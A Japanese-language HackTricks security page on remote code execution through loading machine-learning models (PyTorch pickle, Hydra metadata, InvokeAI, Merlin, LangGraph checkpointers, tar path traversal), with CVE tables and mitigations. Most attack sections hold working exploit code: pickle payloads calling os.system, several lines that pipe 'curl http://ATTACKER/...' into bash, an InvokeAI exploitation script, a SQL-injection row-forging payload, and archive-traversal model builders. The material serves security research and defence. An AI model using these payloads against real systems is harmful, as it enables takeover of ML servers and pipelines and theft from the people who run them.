# モデル RCE

{{#include ../banners/hacktricks-training.md}}

## RCEにつながるモデルのロード

Machine Learningモデルは通常、ONNX、TensorFlow、PyTorchなど、さまざまな形式で共有されます。これらのモデルは、利用するために開発者のマシンやproduction systemsにロードされます。通常、モデルにmalicious codeを含めるべきではありませんが、モデルを使用して意図されたfeatureとしてシステム上でarbitrary codeを実行できる場合や、モデルのloading libraryのvulnerabilityが原因となる場合があります。

執筆時点で、このタイプのvulnerabilityの例には以下があります。

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | モデルcheckpoint内のmalicious pickleによりcode executionが発生（`weights_only` safeguardをbypass）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model downloadによりcode executionが発生；management APIでのJava deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpointが`load_model_trainer_states_from_checkpoint`中にpickle reducerをtriggerし、ML workerでcode executionが発生            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` keyがSQL/JSON-path syntaxをinjectし、`UNION SELECT`でfake checkpoint rowを生成、その後`msgpack` deserializationがattacker-chosen Python codeをimportしてcallする | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLからモデルをロードすると`yaml.unsafe_load`が使用される（code exec） <br> **Lambda** layerを使用してモデルをロードするとarbitrary Python codeが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` modelがinteger overflowをtriggerし、heap corruptionが発生（潜在的なRCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`経由でモデルをロードすると、attackerの`__reduce__` payloadを含むpickleが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`のdefault設定ではpickled object arraysが許可されており、malicious `.npy/.npz`がcode execをtriggerする                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelのexternal-weights pathがdirectory外へescapeできる（arbitrary filesをread） <br> Malicious ONNX model tarがarbitrary filesをoverwriteできる（RCEにつながる） | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operatorを含むモデルではattackerのnative codeのloadingが必要；complex model graphsがlogicをabuseして意図しないcomputationsを実行する   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`を有効にしたmodel-load APIの使用によりrelative path traversalでfilesを書き込める（例：RCEのために`.bashrc`をoverwrite）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model fileがparserでheap buffer overflowsを発生させ、victim system上でarbitrary code executionを可能にする                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layerを含むmalicious HDF5（`.h5`）modelのcodeはload時にも実行される（Keras safe_modeはold formatをcoverしない – “downgrade attack”） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くのML tools（例：pickle-based model formats、Python `pickle.load`）は、mitigationされていない場合、model filesにembeddedされたarbitrary codeを実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/configが`_target_`をarbitrary callable（例：`builtins.exec`）に設定し、load中に実行される。 “safe” formats（`.safetensors`、`.nemo`、repo `config.json`）でも同様 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使用されるもののように、Python pickle-based modelsの中には、`weights_only=True`でロードされない場合にシステム上でarbitrary codeを実行するために使用できるものがあります。そのため、pickle-based modelは、上のtableに記載されていない場合でも、このタイプのattackに特にsusceptibleである可能性があります。

### Hydra metadata → RCE（safetensorsでも動作）

`hydra.utils.instantiate()`は、configuration/metadata object内の任意のdotted `_target_`をimportしてcallします。librariesが**untrusted model metadata**を`instantiate()`に渡す場合、attackerはmodel load中に即座に実行されるcallableとargumentsを提供できます（pickleは不要）。<sup>[[12]](#references)[[13]](#references)</sup>

Payload example（`.nemo`の`model_config.yaml`、repoの`config.json`、または`safetensors`内の`__metadata__`で動作）：
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
主なポイント:
- NeMo の `restore_from/from_pretrained`、uni2TS の HuggingFace coders、FlexTok loaders で、model initialization の前に trigger される。
- Hydra の string block-list は、alternative import paths（例: `enum.bltns.eval`）や、application-resolved names（例: `nemo.core.classes.common.os.system` → `posix`）によって bypass 可能。<sup>[[14]](#references)</sup>
- FlexTok は `ast.literal_eval` を使って stringified metadata も parse するため、Hydra call の前に DoS（CPU/memory blowup）を引き起こせる。

### 🆕 InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` は Stable-Diffusion 用の人気のある open-source web interface。**5.3.1 – 5.4.2** では、任意の URL から models を download および load できる REST endpoint `/api/v2/models/install` が公開されている。<sup>[[1]](#references)</sup>

内部的に、この endpoint は最終的に次を call する:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
指定されたファイルが **PyTorch checkpoint（`*.ckpt`）** の場合、`torch.load` は **pickle deserialization** を実行します。コンテンツは user-controlled URL から直接取得されるため、攻撃者は checkpoint 内にカスタム `__reduce__` メソッドを持つ悪意のあるオブジェクトを埋め込むことができます。このメソッドは **deserialization 中に** 実行され、InvokeAI サーバー上で **remote code execution（RCE）** につながります。

この脆弱性には **CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）が割り当てられました。

#### Exploitation walk-through

1. 悪意のある checkpoint を作成します:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` を自身が管理する HTTP server（例: `http://ATTACKER/payload.ckpt`）上にホストします。
3. 脆弱な endpoint をトリガーします（認証は不要です）。
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し、`os.system` gadget が実行され、攻撃者は InvokeAI process の context で code execution を獲得します。

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連の flow 全体を自動化します。<sup>[[3]](#references)</sup>

#### Conditions

•  InvokeAI 5.3.1-5.4.2（scan flag の default は **false**）  
•  `/api/v2/models/install` に attacker から到達可能  
•  Process に shell commands を実行する permissions があること

#### Mitigations

* **InvokeAI ≥ 5.4.3** に upgrade する - patch により default で `scan=True` が設定され、deserialization の前に malware scanning が実行されます。<sup>[[2]](#references)</sup>
* Checkpoints を programmatically 読み込む場合は `torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用します。
* Model sources に対して allow-lists / signatures を適用し、service を least-privilege で実行します。

> ⚠️ **untrusted sources** から deserialization する場合、（多くの `.pt`、`.pkl`、`.ckpt`、`.pth` files を含む）**Python pickle-based format は本質的に unsafe** であることを忘れないでください。

---

古い InvokeAI versions を reverse proxy の behind で実行し続ける必要がある場合の、ad-hoc mitigation の例:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA の Transformers4Rec（Merlin の一部）では、ユーザーが指定したパスに対して直接 `torch.load()` を呼び出す、unsafe な checkpoint loader が公開されていました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が制御する checkpoint によって、デシリアライズ中の reducer を介して任意のコードを実行できます。<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

これが RCE につながる理由：Python の pickle では、オブジェクトが reducer（`__reduce__`/`__setstate__`）を定義し、callable と引数を返すことができます。unpickling 中にこの callable が実行されます。このようなオブジェクトが checkpoint に含まれている場合、weights が使用される前にコードが実行されます。

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors と blast radius:
- repos、buckets、または artifact registries 経由で共有される Trojanized checkpoints/models
- checkpoints を自動的にロードする Automated resume/deploy pipelines
- 実行は training/inference workers 内で行われ、多くの場合 elevated privileges（例: containers 内の root）を持つ

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）では、直接的な `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された restricted な allow-listed deserializer に置き換えた。新しい loader は types/fields を検証し、load 中に arbitrary callables が invoke されるのを防止する。<sup>[[7]](#references)</sup>

PyTorch checkpoints に特化した Defensive guidance:
- untrusted data を unpickle しない。可能な場合は、[Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX などの non-executable formats を優先する。
- PyTorch serialization を使用する必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を使用するか、Transformers4Rec の patch と同様の custom allow-listed unpickler を使用する。<sup>[[4]](#references)</sup>
- model provenance/signatures を強制し、deserialization を sandbox 化する（seccomp/AppArmor; non-root user; restricted FS and no network egress）。
- checkpoint load 時に ML services から予期しない child processes が生成されていないか monitor する。`torch.load()`/`pickle` の使用を trace する。

POC and vulnerable/patch references:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Example – malicious PyTorch model の作成

- model を作成する:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルをロードする:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザー制御データを deserialization する `resnet` endpoint を公開しています。ZDI は、リモート attacker が被害者に悪意のあるページまたはファイルを読み込ませ、その endpoint に細工した serialized blob を送信させることで、`root` として deserialization を発生させ、完全な侵害につなげられることを確認しました。

この exploit flow は、典型的な pickle abuse と同様です:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
デシリアライゼーション中に到達可能な gadget（constructor、`__setstate__`、framework callback など）は、transport が HTTP、WebSocket、または watched directory に置かれた file のいずれであっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この attack chain が興味深いのは、attacker が **malicious model file を upload する必要がない** 点です。代わりに、application は **AI-agent persistence API**（`get_state_history(..., filter=...)`）を公開しており、user input が checkpointer query builder に到達します。

#### 1. metadata filters における構造的 SQLi

脆弱な SQLite pattern は次のようなものでした。
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
値は後で bind されますが、`query_key` は **JSON path string** に連結されるため、dictionary key 内の `'` によって `'$.{query_key}'` から抜け出し、SQL を inject できます。同じ教訓は **JSON paths、identifiers、operators、`LIMIT`、TTL fields** にも当てはまります。placeholders が保護するのは values だけであり、query の構造的な syntax は保護しません。

#### 2. `UNION SELECT` は data theft だけでなく downstream sinks も標的にできる

この query は `type` と serialized `checkpoint` bytes を返し、それらは後で次のように消費されます：
```python
self.serde.loads_typed((type, checkpoint))
```
つまり、`WHERE`句のSQLiは**偽の結果行**を注入できます：
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
後続のコードが選択されたカラムを parse、deserialize、write、または execute する場合、それらのカラムを対応する sink にマッピングします。このケースでは、fake row によって SQLi が **attacker-controlled deserialization** に変わります。

#### 3. Unsafe MessagePack extension hooks は code gadgets と同等

LangGraph の `msgpack` path では、nested tuple を unpack して次を execute する custom extension hook が使用されていました:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
したがって、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack extension object は、`os` を import し、`system` を解決して、コマンドを実行します。AI frameworks をレビューする際は、dynamic imports、reflection、または arbitrary callable dispatch に対応する **custom MessagePack/JSON/pickle revivers** を調査してください。

#### 4. agent frameworks の Practical audit pattern

次の項目に到達する user-controlled input をすべてレビューしてください:
- state history / memory / replay / checkpoint listing APIs
- SQL または Redis query fragments を生成する structured filter builders
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- persistence layer から返された rows を信頼する recovery paths

この具体的な chain は、untrusted users が `filter` を制御できる self-hosted LangGraph deployments の **SQLite** または **Redis** checkpointers に影響しました。disclosure で記載された patched versions は、`langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、および `langgraph-checkpoint 4.0.1+` です。<sup>[[15]](#references)</sup>

## Models to Path Traversal

[**この blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) で説明されているように、異なる AI frameworks で使用される多くの models formats は archives、通常は `.zip` をベースにしています。そのため、これらの formats を悪用して path traversal attacks を実行し、model がロードされる system から任意の files を読み取れる可能性があります。<sup>[[16]](#references)</sup>

たとえば、次の code を使用すると、ロード時に `/tmp` directory 内へ file を作成する model を作成できます:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
または、以下のコードを使うと、ロード時に`/tmp`ディレクトリへのシンボリックリンクを作成するモデルを作成できます。
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras の deserialization と gadget hunting

.​​keras の internals、Lambda-layer RCE、≤ 3.8 における arbitrary import issue、および修正後の allowlist 内での gadget discovery に焦点を当てたガイドについては、以下を参照してください。


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog - 「CVE-2024-12029 - InvokeAI Deserialization of Untrusted Data」](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch - torch.load の security considerations](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog - NVIDIA Merlin で Remote Code Execution を実行する CVE-2025-23298](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 - Modern AI/ML Formats and Libraries を用いた Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (RCE に関する警告)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research - SQLi から RCE へ: LangGraph の Checkpointer の Exploiting](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip Bugs を High-Value AI/ML Bounties へ Pivoting](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
